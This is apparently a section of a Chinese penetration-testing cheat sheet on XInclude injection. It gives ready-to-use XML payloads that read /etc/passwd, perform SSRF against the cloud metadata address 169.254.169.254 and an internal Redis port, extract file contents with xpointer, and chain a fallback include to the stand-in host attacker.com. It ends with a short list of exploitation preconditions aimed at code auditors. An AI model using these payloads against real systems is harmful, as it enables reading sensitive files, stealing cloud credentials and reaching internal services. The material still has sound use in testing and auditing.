## 六、XInclude 深度利用

### 6.1 基础：无需 DOCTYPE 的文件包含
```xml
<!-- 适用：禁 DOCTYPE / 已存在 DOCTYPE 无法再插入 / 输入点在元素内部 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### 6.2 HTTP 文件包含（SSRF）
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
</root>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://192.168.1.10:6379/" parse="text"/>
</root>
```

### 6.3 xpointer 精确提取
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" xpointer="xpointer(string-range(/,'',1,1000))" parse="text"/>
</root>
```

### 6.4 XInclude + 参数实体（复合利用，绕过双重过滤）
```xml
<!-- 先声明参数实体读取文件内容 → 再经 XInclude 引入 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="xml">
    <xi:fallback><xi:include href="http://attacker.com/?x=1" parse="text"/></xi:fallback>
  </xi:include>
</root>
```

### 6.5 触发前提（审计代码时注意）
- 解析器必须 `setXIncludeAware(true)`（Java DOM 默认 false，**开启的才是可利用点**）
- XInclude 注入点必须是**元素内容**位置，且属性值位置不可用
- 可用 `xi:fallback` 包裹错误处理，增强健壮性

